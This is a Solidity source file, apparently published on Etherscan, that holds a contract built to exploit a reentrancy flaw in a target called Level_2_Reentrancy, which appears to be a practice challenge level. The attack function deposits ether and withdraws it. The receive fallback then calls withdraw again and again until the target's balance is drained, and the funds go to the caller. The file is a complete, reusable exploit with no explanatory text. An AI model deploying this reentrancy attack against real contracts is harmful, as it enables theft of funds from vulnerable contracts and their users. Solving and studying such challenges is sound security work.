/**
 *Submitted for verification at Etherscan.io on 2021-12-08
*/

pragma solidity 0.6.0;

contract Level_2_Attack {
Level_2_Reentrancy public vulnerable_contract;

constructor(address _target) public {
    vulnerable_contract = Level_2_Reentrancy(_target);
}

receive() external payable {
    if (address(vulnerable_contract).balance > 0.1 ether) {
        vulnerable_contract.withdraw(0.1 ether);
    }
}

function attack() public payable {
    require(msg.value >= 0.1 ether);
    vulnerable_contract.deposit.value(msg.value)();
    vulnerable_contract.withdraw(0.1 ether);
    msg.sender.call.value(address(this).balance)("");
}


}

contract Level_2_Reentrancy {
    function deposit() public payable returns (bool success) {
    }

    function withdraw(uint256 _value) public payable returns (bool success) {
    }

}